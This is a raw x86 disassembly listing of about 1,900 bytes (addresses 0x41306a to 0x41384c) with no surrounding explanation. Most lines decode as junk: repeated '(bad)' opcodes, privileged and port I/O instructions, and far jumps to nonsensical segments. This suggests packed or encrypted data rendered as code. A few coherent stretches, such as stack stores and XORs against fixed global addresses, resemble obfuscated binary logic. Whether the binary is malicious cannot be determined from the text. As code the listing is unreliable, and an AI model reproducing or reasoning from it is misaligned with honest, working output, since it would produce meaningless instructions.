  41306a:	mov    ch,0x8c
  41306c:	(bad)  
  41306d:	fsubr  QWORD PTR [ecx-0x36]
  413070:	in     al,0x24
  413072:	jle    0x413088
  413074:	pop    edi
  413075:	clc    
  413076:	add    DWORD PTR [edi+ecx*8-0x2],ecx
  41307a:	shr    DWORD PTR ds:0x26066cfd,1
  413080:	jne    0x413085
  413082:	mov    al,0x92
  413084:	jle    0x413105
  413086:	xchg   ebp,eax
  413087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413088:	arpl   cx,di
  41308a:	pop    ecx
  41308b:	cwde   
  41308c:	mov    BYTE PTR [eax],0xe4
  41308f:	(bad)  
  413090:	ins    DWORD PTR es:[edi],dx
  413091:	xor    DWORD PTR [esi],ecx
  413093:	mov    BYTE PTR [ebp-0x36fb0692],ch
  413099:	adc    BYTE PTR [edx-0x34f9f9f7],0x32
  4130a0:	sbb    dl,BYTE PTR [esi-0x2e]
  4130a3:	daa    
  4130a4:	inc    esi
  4130a5:	xchg   edx,eax
  4130a6:	cwde   
  4130a7:	out    dx,eax
  4130a8:	mov    eax,0xda2a13bc
  4130ad:	cmp    eax,0x366ede1d
  4130b2:	mov    ch,0x10
  4130b4:	cmp    al,0x71
  4130b6:	jmp    0x9ebe:0xab1ca1f9
  4130bd:	xor    eax,0xb11fda87
  4130c2:	inc    edi
  4130c3:	xchg   DWORD PTR [ecx-0xc],esi
  4130c6:	adc    al,0x35
  4130c8:	or     ah,bl
  4130ca:	cli    
  4130cb:	sti    
  4130cc:	in     eax,dx
  4130cd:	jns    0x4130da
  4130cf:	pop    esp
  4130d0:	or     ah,dh
  4130d2:	pop    ebx
  4130d3:	jo     0x4130c2
  4130d5:	popf   
  4130d6:	les    esi,FWORD PTR [ecx-0x74ecf222]
  4130dc:	mov    esi,?
  4130de:	and    ebx,eax
  4130e0:	sub    eax,0x59dca100
  4130e5:	into   
  4130e6:	pop    ebp
  4130e7:	scas   eax,DWORD PTR es:[edi]
  4130e8:	rcl    DWORD PTR [edi],1
  4130ea:	call   0xd8d4:0xbf556559
  4130f1:	mov    al,dl
  4130f3:	xchg   edx,eax
  4130f4:	xchg   ebx,eax
  4130f5:	ins    BYTE PTR es:[edi],dx
  4130f6:	pop    ebx
  4130f7:	fs cmp esi,DWORD PTR gs:[edx+0x2f]
  4130fc:	stc    
  4130fd:	and    ecx,esi
  4130ff:	and    edx,edi
  413101:	adc    bh,BYTE PTR [edx-0x23]
  413104:	xchg   ebp,eax
  413105:	and    bh,BYTE PTR [ebp+0x512c6f14]
  41310b:	out    0xd8,al
  41310d:	pop    eax
  41310e:	pop    es
  41310f:	xchg   esp,eax
  413110:	cmp    BYTE PTR [si+0x2a],bl
  413114:	mov    ds:0xf843a018,eax
  413119:	cmp    DWORD PTR [ecx+ebx*2-0x18],ecx
  41311d:	and    al,0xca
  41311f:	loope  0x4130d9
  413121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413122:	aas    
  413123:	mov    ebp,0x3fe102ad
  413128:	add    bl,cl
  41312a:	repz addr16 jnp 0x413111
  41312e:	mov    dh,0xea
  413130:	mov    bh,0x3d
  413132:	push   ss
  413133:	inc    edx
  413134:	or     ebx,DWORD PTR [ebx+0x6c]
  413137:	mov    cl,0xa8
  413139:	call   0x60dbac8b
  41313e:	retf   
  41313f:	cmp    eax,esi
  413141:	push   edx
  413142:	mov    bh,0xe8
  413144:	and    BYTE PTR [edi+ecx*4-0x278a7624],al
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	loopne 0x4131b2
  413180:	adc    al,0xfd
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x413170
  41318b:	out    dx,eax
  41318c:	mov    ah,0x6a
  41318e:	lock out 0xcc,eax
  413191:	inc    ebx
  413192:	add    esp,DWORD PTR [ebp+0x2]
  413195:	pop    ecx
  413196:	and    eax,0x27b5604d
  41319b:	dec    ebx
  41319c:	dec    edi
  41319d:	iret   
  41319e:	jge    0x4131d5
  4131a0:	jmp    0xe5b4c140
  4131a5:	mov    bh,BYTE PTR [edx+0x370ee8ec]
  4131ab:	jbe    0x41321f
  4131ad:	add    BYTE PTR [ecx+0x49],0x5f
  4131b1:	cmp    ebx,ecx
  4131b3:	xchg   esp,eax
  4131b4:	xrelease xchg DWORD PTR [ebx],esp
  4131b7:	(bad)  
  4131b9:	mov    ds:0x4a674f8e,eax
  4131be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131bf:	dec    ebx
  4131c0:	popf   
  4131c1:	repnz xor dl,ah
  4131c4:	push   es
  4131c5:	sahf   
  4131c6:	mov    esi,0xdfd435c3
  4131cb:	mov    dh,0xfa
  4131cd:	rcr    DWORD PTR [esi+0xf777e25],cl
  4131d3:	adc    edx,DWORD PTR [esi-0x32]
  4131d6:	rol    dh,0x29
  4131d9:	icebp  
  4131da:	mov    ecx,0x9a3597cc
  4131df:	enter  0x1e42,0xd
  4131e3:	jnp    0x413263
  4131e5:	sar    BYTE PTR [esi+edi*2+0xd],1
  4131e9:	jmp    0x4131e9
  4131eb:	clc    
  4131ec:	xchg   BYTE PTR [ecx],bl
  4131ee:	(bad)  
  4131ef:	mov    edx,0xb282f501
  4131f4:	dec    ebp
  4131f5:	lods   al,BYTE PTR ds:[esi]
  4131f6:	sub    ah,bl
  4131f8:	jp     0x4131dd
  4131fa:	mov    cl,0x2b
  4131fc:	retf   
  4131fd:	test   BYTE PTR [ebx-0x60],bl
  413200:	push   eax
  413201:	test   DWORD PTR [ebp+0x57],0x8edc16d1
  413208:	(bad)  
  41320a:	int3   
  41320b:	aas    
  41320c:	test   al,0xea
  41320e:	fld    st(2)
  413210:	mov    ah,0x93
  413212:	ss cmp al,cl
  413215:	push   esp
  413216:	inc    edi
  413217:	add    DWORD PTR ds:0x1b569ab7,0xffffffda
  41321e:	pop    ebp
  41321f:	in     al,dx
  413220:	xor    DWORD PTR [ebp+0x1],edx
  413223:	pushf  
  413224:	(bad)  
  413225:	add    DWORD PTR [esi-0x16],0x4f
  413229:	xchg   ecx,ebp
  41322b:	retf   0x12bc
  41322e:	jnp    0x413240
  413230:	jns    0x413288
  413232:	or     cl,BYTE PTR [esi+0x555b232]
  413238:	mov    eax,0x3b5234fb
  41323d:	ret    
  41323e:	mov    dl,0x14
  413240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413241:	popa   
  413242:	stos   DWORD PTR es:[edi],eax
  413243:	jae    0x413255
  413245:	jmp    0x1c15:0x22710811
  41324c:	je     0x413291
  41324e:	ja     0x41321d
  413250:	jmp    0x1106:0x9ffe885e
  413257:	pop    ecx
  413258:	popf   
  413259:	loop   0x41326e
  41325b:	xor    DWORD PTR [esi],0xffffff94
  41325e:	push   ebp
  41325f:	push   0xffffff81
  413261:	sub    ebp,DWORD PTR [ebp+0x1e699e52]
  413267:	mov    al,ds:0xe61ebb87
  41326c:	and    al,0x51
  41326e:	sub    DWORD PTR [eax],ebx
  413270:	test   al,0x35
  413272:	mov    ch,0x7d
  413274:	or     edi,ecx
  413276:	shl    ecx,cl
  413278:	stc    
  413279:	add    al,0x90
  41327b:	adc    eax,0x8f5e8b46
  413280:	cdq    
  413281:	cmp    ecx,DWORD PTR [ecx+0x59]
  413284:	and    ch,BYTE PTR [edi-0x27542e17]
  41328a:	mov    cl,0xdb
  41328c:	loop   0x41321b
  41328e:	ins    BYTE PTR es:[edi],dx
  41328f:	lahf   
  413290:	xchg   BYTE PTR [edx],al
  413292:	mov    ds:0x616ae64a,al
  413297:	add    al,0x1b
  413299:	in     eax,dx
  41329a:	je     0x413222
  41329c:	je     0x413275
  41329e:	and    al,0xbf
  4132a0:	nop
  4132a1:	leave  
  4132a2:	mov    eax,ds:0xdf02f31d
  4132a7:	mov    DWORD PTR [ebp-0x76b9f852],ebp
  4132ad:	into   
  4132ae:	mov    DWORD PTR [eax+0xa004ccc],edx
  4132b4:	pop    eax
  4132b5:	inc    ebx
  4132b6:	adc    edx,eax
  4132b8:	dec    ebx
  4132b9:	pushf  
  4132ba:	retf   0xb4e3
  4132bd:	(bad)  
  4132be:	enter  0x2bca,0xb3
  4132c2:	cmp    BYTE PTR [ebp-0x3c],bl
  4132c5:	out    0xb3,al
  4132c7:	push   edx
  4132c8:	sbb    al,0xe0
  4132ca:	cmc    
  4132cb:	dec    ebp
  4132cc:	(bad)  
  4132cd:	popa   
  4132ce:	dec    esi
  4132cf:	fisttp WORD PTR [ecx-0x35a0f127]
  4132d5:	mov    ah,0x16
  4132d7:	std    
  4132d8:	cdq    
  4132d9:	inc    eax
  4132da:	pop    ecx
  4132db:	and    al,0xca
  4132dd:	stos   BYTE PTR es:[edi],al
  4132de:	into   
  4132df:	nop
  4132e0:	and    eax,0x92b5ed83
  4132e5:	push   ebp
  4132e6:	ret    0xa9d2
  4132e9:	bound  eax,QWORD PTR [edi-0x37201e72]
  4132ef:	arpl   WORD PTR [esi+0x1f6a1622],si
  4132f5:	ror    BYTE PTR [ebx+ecx*4+0x378b55f5],cl
  4132fc:	loop   0x4132b5
  4132fe:	push   es
  4132ff:	shl    DWORD PTR [edi+0x21],cl
  413302:	dec    esp
  413303:	jne    0x413294
  413305:	or     DWORD PTR [ecx-0xc],esp
  413308:	xlat   BYTE PTR ds:[ebx]
  413309:	inc    edi
  41330a:	scas   al,BYTE PTR es:[edi]
  41330b:	mov    edx,0x8d7a4b21
  413310:	(bad)  
  413312:	xor    BYTE PTR [ebp-0x4a],bl
  413315:	adc    al,0x1c
  413317:	outs   dx,DWORD PTR ds:[esi]
  413318:	sahf   
  413319:	ins    BYTE PTR es:[edi],dx
  41331a:	js     0x4132ed
  41331c:	pop    esi
  41331d:	call   0x36f9e734
  413322:	scas   eax,DWORD PTR es:[edi]
  413323:	and    edx,0x71
  413326:	out    dx,eax
  413327:	mov    ebx,0xf20bb088
  41332c:	push   eax
  41332d:	retf   
  41332e:	jg     0x413319
  413330:	out    dx,eax
  413331:	aas    
  413332:	ds stos BYTE PTR es:[edi],al
  413334:	fcomi  st,st(0)
  413336:	not    DWORD PTR [ebp-0x66f88794]
  41333c:	bound  edi,QWORD PTR [edi]
  41333e:	adc    BYTE PTR [esi-0x69],cl
  413341:	test   al,0x42
  413343:	sub    ebp,DWORD PTR [ebx+0x72]
  413346:	mov    bl,0x32
  413348:	mov    eax,0x1e0f248c
  41334d:	aas    
  41334e:	inc    ebx
  41334f:	mov    al,ds:0x4a61fd2d
  413354:	or     cl,BYTE PTR [edi+ebx*1]
  413357:	sub    ebp,ebp
  413359:	loopne 0x41330d
  41335b:	(bad)  
  41335c:	lds    ebx,FWORD PTR [edx]
  41335e:	in     eax,dx
  41335f:	loop   0x413373
  413361:	cmc    
  413362:	sub    eax,0xcbb3e682
  413367:	jne    0x413323
  413369:	(bad)  
  41336a:	out    dx,eax
  41336b:	adc    eax,0x484360c
  413370:	mov    al,0x7f
  413372:	add    DWORD PTR [eax+edx*1-0x73],eax
  413376:	or     al,0xe9
  413378:	adc    esp,ebx
  41337a:	and    eax,0xe4a45ff9
  41337f:	sahf   
  413380:	jp     0x413335
  413382:	sbb    BYTE PTR [edx-0x34067567],dl
  413388:	imul   edi,DWORD PTR [eax],0x6caf02a7
  41338e:	lods   al,BYTE PTR ds:[esi]
  41338f:	icebp  
  413390:	ss mov ebx,0x461c753b
  413396:	mov    cl,0x53
  413398:	sub    eax,0x6367103f
  41339d:	jo     0x413345
  41339f:	and    al,0xe2
  4133a1:	or     eax,0xd8767648
  4133a6:	std    
  4133a7:	je     0x4133a7
  4133a9:	cmp    cl,bl
  4133ab:	pop    ecx
  4133ac:	cli    
  4133ad:	cmp    eax,0x786e34cf
  4133b2:	jne    0x4133e7
  4133b4:	out    dx,eax
  4133b5:	dec    edi
  4133b6:	sub    DWORD PTR [ebx],esi
  4133b8:	mov    esp,0x50a9f61f
  4133bd:	or     eax,0xb5531881
  4133c2:	outs   dx,BYTE PTR ds:[esi]
  4133c3:	fisubr DWORD PTR [esi]
  4133c5:	adc    WORD PTR [ebp-0x43],si
  4133c9:	cmp    DWORD PTR [edx+ecx*4-0x56],ecx
  4133cd:	lods   al,BYTE PTR ds:[esi]
  4133ce:	lods   eax,DWORD PTR ds:[esi]
  4133cf:	pop    ds
  4133d0:	fcmovbe st,st(2)
  4133d2:	dec    ecx
  4133d3:	pop    ebp
  4133d4:	pop    esp
  4133d5:	lahf   
  4133d6:	inc    esp
  4133d7:	jge    0x4133e3
  4133d9:	scas   eax,DWORD PTR es:[edi]
  4133da:	lods   al,BYTE PTR ds:[esi]
  4133db:	push   ss
  4133dc:	xlat   BYTE PTR ds:[ebx]
  4133dd:	inc    ebx
  4133de:	out    0x5c,al
  4133e0:	(bad)  
  4133e1:	fs cwde 
  4133e3:	rcr    BYTE PTR [edi+0x37],1
  4133e6:	pop    eax
  4133e7:	mov    ebx,0xab48e6af
  4133ec:	jle    0x41338a
  4133ee:	jo     0x4133ec
  4133f0:	pop    edx
  4133f1:	mov    ds:0xdff1d9ba,al
  4133f6:	shl    esi,1
  4133f8:	pop    esi
  4133f9:	sbb    BYTE PTR [ecx+0x69],ch
  4133fc:	aam    0x7f
  4133fe:	cmp    BYTE PTR ds:0xe5b214e5,bh
  413404:	cs out dx,al
  413406:	jmp    0x413399
  413408:	sti    
  413409:	adc    ebp,DWORD PTR [edx+edx*4+0x56973949]
  413410:	or     eax,0xf1fb914
  413415:	aas    
  413416:	ficomp DWORD PTR [edx+0x4380721e]
  41341c:	dec    edi
  41341d:	xor    ecx,DWORD PTR [edx+0x7a46fbb9]
  413423:	push   ebx
  413424:	xor    ch,BYTE PTR [esi+eiz*8]
  413427:	or     BYTE PTR [edx+edx*8],ch
  41342a:	jns    0x413438
  41342c:	push   DWORD PTR [edi-0x3ab9f738]
  413432:	cmp    eax,0x2047e8c
  413437:	jns    0x41345c
  413439:	ins    DWORD PTR es:[edi],dx
  41343a:	hlt    
  41343b:	imul   esp,DWORD PTR [ebx-0x4],0x93d9aeca
  413442:	mov    esp,0x3139b58e
  413447:	adc    BYTE PTR [esi+0x26e4f89a],al
  41344d:	cmp    ebp,ecx
  41344f:	ins    BYTE PTR es:[edi],dx
  413450:	add    al,BYTE PTR [ebx]
  413452:	retf   
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x5757170f,al
  413492:	pop    esi
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x4470707e
  41349c:	clc    
  41349d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41349e:	pop    ecx
  41349f:	lahf   
  4134a0:	(bad)
  4134a5:	rol    DWORD PTR [ebx+0x36],1
  4134a8:	scas   al,BYTE PTR es:[edi]
  4134a9:	outs   dx,DWORD PTR ds:[esi]
  4134aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ab:	mov    ecx,0x728dd4bc
  4134b0:	jae    0x4134d8
  4134b2:	jmp    0x4134b2
  4134b4:	add    cl,0xc6
  4134b7:	jle    0x413534
  4134b9:	xor    eax,0xbbb73a5d
  4134be:	ret    0xb72a
  4134c1:	jmp    0x4134cb
  4134c3:	imul   edi,DWORD PTR [ebx],0x10
  4134c6:	dec    edi
  4134c7:	cdq    
  4134c8:	jmp    0x64a6aef2
  4134cd:	mov    dl,BYTE PTR [edi-0x61995964]
  4134d3:	stos   DWORD PTR es:[edi],eax
  4134d4:	enter  0x1b7d,0x76
  4134d8:	clc    
  4134d9:	xor    al,0x28
  4134db:	push   0xf70bddcd
  4134e0:	repz ret 
  4134e2:	xchg   edx,eax
  4134e3:	xor    DWORD PTR [esi],ecx
  4134e5:	lock ret 0x3ea1
  4134e9:	lahf   
  4134ea:	cmp    ebx,ecx
  4134ec:	pop    ds
  4134ed:	jle    0x413530
  4134ef:	jnp    0x413558
  4134f1:	push   esp
  4134f2:	loope  0x4134cd
  4134f4:	shr    BYTE PTR [ebp-0x709aad5a],1
  4134fa:	sbb    ebp,0x3cf6c13f
  413500:	jp     0x4134d8
  413502:	aas    
  413503:	shl    BYTE PTR [edx-0x21],1
  413506:	or     DWORD PTR [ecx-0x2f8ddabc],eax
  41350c:	jmp    0xc8e0:0xe52136e4
  413513:	scas   al,BYTE PTR es:[edi]
  413514:	ret    
  413515:	repnz push eax
  413517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413518:	fld    TBYTE PTR [ebp+0x5a]
  41351b:	retf   0xf596
  41351e:	lea    ecx,[ebp-0xdeb5cc2]
  413524:	dec    esp
  413525:	mov    WORD PTR [edx-0x67],ss
  413528:	pop    ss
  413529:	fsub   QWORD PTR [ebx+0x38]
  41352c:	cmp    eax,DWORD PTR [edx+ebx*8-0x60]
  413530:	rcr    ebx,0x34
  413533:	loope  0x4134ca
  413535:	clc    
  413536:	(bad)  
  413537:	stc    
  413538:	jg     0x413570
  41353a:	jns    0x4134e3
  41353c:	ficom  WORD PTR gs:[edx]
  41353f:	int    0xac
  413541:	push   es
  413542:	outs   dx,DWORD PTR ds:[esi]
  413543:	cmp    ebp,0xaeffeb63
  413549:	push   cs
  41354a:	pop    eax
  41354b:	pop    eax
  41354c:	push   ds
  41354d:	xchg   DWORD PTR gs:[edi],esp
  413550:	sbb    al,0x13
  413552:	out    0xa9,eax
  413554:	adc    DWORD PTR [esi+0x47ebf777],0x8fe40c7f
  41355e:	dec    edi
  41355f:	mov    DWORD PTR [ecx-0x32],ebx
  413562:	rol    BYTE PTR [edx-0x48],0xce
  413566:	mov    al,ds:0xc4c7ce0d
  41356b:	sub    dl,BYTE PTR [eax+ebx*8]
  41356e:	cmp    eax,0xe66d6ca9
  413573:	adc    edx,esp
  413575:	aam    0x96
  413577:	pop    edx
  413578:	jmp    0xd9b8:0x68dcc4d7
  41357f:	dec    ebx
  413580:	mov    dh,0x71
  413582:	aaa    
  413583:	inc    ebx
  413584:	inc    ecx
  413585:	test   DWORD PTR [esi],esp
  413587:	mov    ecx,0x86474fd7
  41358c:	xor    DWORD PTR [edi-0x2c],ebx
  41358f:	mov    al,0xc
  413591:	push   edx
  413592:	xor    al,0x22
  413594:	(bad)  
  413595:	sub    eax,0xbf21f79d
  41359a:	push   0xd0d994f2
  41359f:	loop   0x413554
  4135a1:	mov    edx,0xcd28056c
  4135a6:	mov    al,ds:0x1e10adc1
  4135ab:	retf   
  4135ac:	and    ebx,DWORD PTR [ecx+0x4a9ae546]
  4135b2:	xchg   ebp,eax
  4135b3:	mov    ecx,0xe5ea5767
  4135b9:	jns    0x4135ee
  4135bb:	push   es
  4135bc:	(bad)  
  4135bd:	cli    
  4135be:	mov    ecx,0x20c941de
  4135c3:	pop    ds
  4135c4:	lahf   
  4135c5:	adc    al,0x4b
  4135c7:	sub    al,0x98
  4135c9:	test   DWORD PTR [esi+0x1fc58a3d],esp
  4135cf:	jne    0x4135f1
  4135d1:	xor    ch,BYTE PTR [ecx-0x23]
  4135d4:	push   cs
  4135d5:	push   ss
  4135d6:	cli    
  4135d7:	mov    gs,WORD PTR [edx+0x2a]
  4135da:	mov    edx,0x4d63a791
  4135df:	mov    al,0x85
  4135e1:	(bad)  
  4135e2:	jb     0x413597
  4135e4:	cdq    
  4135e5:	rcr    BYTE PTR [ebp+0x53],cl
  4135e8:	cmp    cl,BYTE PTR [ecx]
  4135ea:	popf   
  4135eb:	(bad)  
  4135ec:	(bad)  
  4135ed:	push   esp
  4135ee:	or     eax,0xd707f4f3
  4135f3:	ror    BYTE PTR [edi-0x4acc3d23],cl
  4135f9:	adc    ecx,DWORD PTR [edi]
  4135fb:	outs   dx,DWORD PTR ds:[esi]
  4135fc:	stos   BYTE PTR es:[edi],al
  4135fd:	js     0x41365b
  4135ff:	js     0x413672
  413601:	test   eax,0x6af5fe1a
  413606:	cmp    al,0xfd
  413608:	stos   BYTE PTR es:[edi],al
  413609:	adc    al,0x9f
  41360b:	pop    edx
  41360c:	inc    ecx
  41360d:	add    al,0xa9
  41360f:	xor    al,BYTE PTR [eax-0x7302e22e]
  413615:	jo     0x4135d8
  413617:	xlat   BYTE PTR ds:[ebx]
  413618:	cmp    DWORD PTR [ebx],ebx
  41361a:	xchg   esi,eax
  41361b:	dec    ebx
  41361c:	xor    ebx,DWORD PTR [edi+0x2c]
  41361f:	stos   BYTE PTR es:[edi],al
  413620:	retf   0xf6ee
  413623:	(bad)  
  413624:	cld    
  413625:	sbb    BYTE PTR [ebx+0x60],ah
  413628:	jmp    0x413679
  41362a:	cs xchg ecx,eax
  41362c:	cwde   
  41362d:	mov    al,ds:0xa189e3d1
  413632:	int    0x20
  413634:	ret    0x39c1
  413637:	pop    esi
  413638:	scas   eax,DWORD PTR es:[edi]
  413639:	dec    eax
  41363a:	outs   dx,BYTE PTR ds:[esi]
  41363b:	fbld   TBYTE PTR [ebp+0x3d]
  41363e:	cmp    al,0xd9
  413640:	jge    0x41365e
  413642:	mov    eax,ds:0x998bf6a5
  413647:	fstp   QWORD PTR [edx-0x21bf431d]
  41364d:	in     eax,0xef
  41364f:	pusha  
  413650:	test   DWORD PTR [eax-0xa871b23],esi
  413656:	xor    edi,DWORD PTR [ebp-0x3e4a5d8f]
  41365c:	sbb    DWORD PTR [ebp+ebx*8-0x71b32223],edx
  413663:	jno    0x413663
  413665:	dec    esi
  413666:	dec    esi
  413667:	inc    edi
  413668:	push   esi
  413669:	inc    edi
  41366a:	aad    0x70
  41366c:	xchg   DWORD PTR [edx+0x15],ecx
  41366f:	push   ds
  413670:	std    
  413671:	jae    0x413613
  413673:	xchg   edi,eax
  413674:	fcomp  QWORD PTR [ecx]
  413676:	(bad)  
  413677:	das    
  413678:	inc    ecx
  413679:	fisttp QWORD PTR [edx-0xc]
  41367c:	mov    gs,eax
  41367e:	xor    DWORD PTR [esi-0x70],0x68
  413682:	mov    eax,ds:0x1c54e2a1
  413687:	lock mov bl,0x5e
  41368a:	dec    ebx
  41368b:	scas   al,BYTE PTR es:[edi]
  41368c:	push   ecx
  41368d:	adc    al,0x1e
  41368f:	xor    DWORD PTR [ebp+0x1b148f5b],edx
  413695:	cli    
  413696:	jmp    0x5007db53
  41369b:	or     ebx,esi
  41369d:	stc    
  41369e:	fisub  DWORD PTR [ebx+0x58317b59]
  4136a4:	pop    ebx
  4136a5:	xchg   esp,eax
  4136a6:	mov    eax,0x1861349c
  4136ab:	sub    BYTE PTR [esi+ebp*1-0x60],ch
  4136af:	mov    al,ds:0xcea4e321
  4136b4:	pushf  
  4136b5:	lahf   
  4136b6:	jae    0x413694
  4136b8:	mov    esp,0x70d4e4e5
  4136bd:	dec    esp
  4136be:	(bad)  
  4136c0:	popf   
  4136c1:	inc    edi
  4136c2:	pusha  
  4136c3:	into   
  4136c4:	push   ds
  4136c5:	pop    ecx
  4136c6:	(bad)  
  4136c7:	out    dx,al
  4136c8:	lods   al,BYTE PTR ds:[esi]
  4136c9:	retf   0x40a8
  4136cc:	pop    esp
  4136cd:	add    edi,DWORD PTR [ebx+0x4084de07]
  4136d3:	(bad)  
  4136d5:	test   al,dh
  4136d7:	push   ss
  4136d8:	or     BYTE PTR [esi+0x667f0f25],bh
  4136de:	and    DWORD PTR [ebx+0xbe01985],ebx
  4136e4:	cmp    BYTE PTR [esi+ecx*8+0x2],ah
  4136e8:	(bad)
  4136eb:	pop    esi
  4136ec:	ret    0x6221
  4136ef:	add    al,0x5b
  4136f2:	push   0x2eb66974
  4136f7:	xor    cl,BYTE PTR [esi-0x60]
  4136fa:	mov    fs,WORD PTR [eax-0x777b2409]
  413700:	xchg   esp,eax
  413701:	das    
  413702:	ins    BYTE PTR es:[edi],dx
  413703:	xor    ebx,DWORD PTR ds:0x96493a4b
  413709:	(bad)  
  41370a:	bound  esp,QWORD PTR [esi]
  41370c:	test   DWORD PTR [edi],ebx
  41370e:	out    0x61,eax
  413710:	xchg   esi,eax
  413711:	dec    eax
  413712:	dec    edx
  413713:	mov    esi,0x46a2e724
  413718:	xchg   esi,eax
  413719:	push   edx
  41371a:	mov    bh,0x3c
  41371c:	mov    DWORD PTR [edx+0x2d],ebp
  41371f:	and    bl,BYTE PTR ds:0x714873a2
  413725:	mov    cx,0xb68d
  413729:	pusha  
  41372a:	jmp    0x413704
  41372c:	fild   WORD PTR [esi]
  41372e:	(bad)  
  413730:	fsubrp st(7),st
  413732:	pop    edx
  413733:	hlt    
  413734:	xchg   esi,eax
  413735:	fimul  DWORD PTR [edx]
  413737:	jb     0x413778
  413739:	mov    ds:0x83117f60,al
  41373e:	fidiv  WORD PTR [eax]
  413740:	mov    ch,0xa5
  413742:	pushf  
  413743:	add    al,BYTE PTR [ebx+eiz*2+0x28123a61]
  41374a:	test   BYTE PTR [ecx],bl
  41374c:	dec    ebx
  41374d:	(bad)  
  41374e:	push   esp
  41374f:	scas   eax,DWORD PTR es:[edi]
  413750:	push   esp
  413751:	jnp    0x4137cf
  413753:	jnp    0x4137ae
  413755:	mov    cl,0xa9
  413757:	das    
  413758:	out    0x11,al
  41375a:	and    dh,dl
  41375c:	out    0xc6,al
  41375e:	(bad)  
  41375f:	out    dx,al
  413760:	cmp    BYTE PTR [eax],ah
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	push   esi
  41377f:	stos   BYTE PTR es:[edi],al
  413780:	push   eax
  413781:	inc    esi
  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x41371a
  41378b:	ds sahf 
  41378d:	dec    ecx
  41378e:	xchg   esi,eax
  41378f:	sub    edi,eax
  413791:	bnd jns 0x413757
  413794:	add    DWORD PTR [ebx-0x7a2e6ba1],ebp
  41379a:	cs js  0x413756
  41379d:	popa   
  41379e:	push   ebp
  41379f:	int    0xfa
  4137a1:	sub    eax,0x292c1973
  4137a6:	sub    BYTE PTR [ebx],0x24
  4137a9:	pop    edx
  4137aa:	and    DWORD PTR [eax-0xb2a62ff],eax
  4137b0:	add    al,0xa9
  4137b2:	jne    0x41377c
  4137b4:	inc    ecx
  4137b5:	cmp    eax,0xff768d6d
  4137ba:	idiv   dl
  4137bc:	rcl    DWORD PTR [edi],cl
  4137be:	mov    WORD PTR [ebx],cs
  4137c0:	push   ss
  4137c1:	ja     0x4137f0
  4137c3:	jmp    0x497da9e0
  4137c8:	out    dx,al
  4137c9:	mov    fs,WORD PTR [edi-0x6]
  4137cc:	jbe    0x413762
  4137ce:	adc    eax,0x7f5b8ad7
  4137d3:	jmp    0x41383c
  4137d5:	xchg   esi,eax
  4137d6:	dec    ebp
  4137d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137d8:	push   edx
  4137d9:	xchg   edx,eax
  4137da:	xchg   ebx,eax
  4137db:	xchg   esi,eax
  4137dc:	rcr    ch,0x60
  4137df:	mov    eax,DWORD PTR [edx+eax*4]
  4137e2:	push   edi
  4137e3:	mov    es,WORD PTR [ebp-0x386ab92e]
  4137e9:	shr    DWORD PTR [esi+0x1f],cl
  4137ec:	clc    
  4137ed:	lods   al,BYTE PTR ds:[esi]
  4137ee:	or     esi,DWORD PTR [esi]
  4137f0:	nop
  4137f1:	inc    dh
  4137f3:	and    eax,0x7f
  4137f6:	fwait
  4137f7:	adc    ch,BYTE PTR [edi+0x7b]
  4137fa:	aas    
  4137fb:	loop   0x413853
  4137fd:	in     al,0xf0
  4137ff:	je     0x41387c
  413801:	(bad)  
  413802:	addr16 jmp 0x5288:0xab9cf1e
  41380a:	test   eax,0xcc437a4f
  41380f:	or     dh,BYTE PTR [ecx-0x79]
  413812:	jmp    0x6105:0x2be2413d
  413819:	or     al,0xfa
  41381b:	or     edx,DWORD PTR ds:0x71868836
  413821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413822:	inc    ebx
  413823:	cmp    ecx,DWORD PTR [ecx-0x37e10852]
  413829:	xlat   BYTE PTR ds:[ebx]
  41382a:	out    dx,eax
  41382b:	xor    DWORD PTR [ebp-0x36554120],esp
  413831:	xchg   esi,eax
  413832:	in     al,dx
  413833:	and    al,0xe4
  413835:	jg     0x41385c
  413837:	inc    edx
  413838:	(bad)
  41383c:	and    bh,BYTE PTR [ecx+edi*8]
  41383f:	xor    eax,0x567c0098
  413844:	adc    DWORD PTR [ebp-0x67],eax
  413847:	aad    0x29
  413849:	(bad)  
  41384a:	je     0x4137f4
  41384c:	ret    
